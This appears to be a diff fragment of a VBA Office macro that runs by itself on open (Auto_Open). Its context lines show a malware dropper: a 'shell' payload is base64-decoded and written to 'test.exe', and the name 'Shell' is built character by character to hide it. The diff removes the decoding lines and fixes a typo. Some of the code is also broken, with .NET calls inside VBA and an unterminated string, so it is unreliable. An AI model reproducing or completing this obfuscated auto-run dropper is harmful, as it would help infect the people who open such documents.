@@ -7,8 +7,6 @@ Sub Auto_Open()
     
     Dim out As String
     Dim data() As Byte
-    data = System.Convert.FromBase64String(shell)
-    out = System.Text.AsciiEncoding.Ascii.GetString(data)
     
     Dim myFile As String
     myFile = place & "\test.exe
@@ -29,7 +27,7 @@ Sub Auto_Open()
     
     Set streamOutput = Nothing
     Set xmlDoc = Nothing
-    Set xmlElem = Nothin
+    Set xmlElem = Nothing
     
     Dim UTrCSyfcE
     UTrCSyfcE = "S" & "h" & "e" & "l" & "l" 
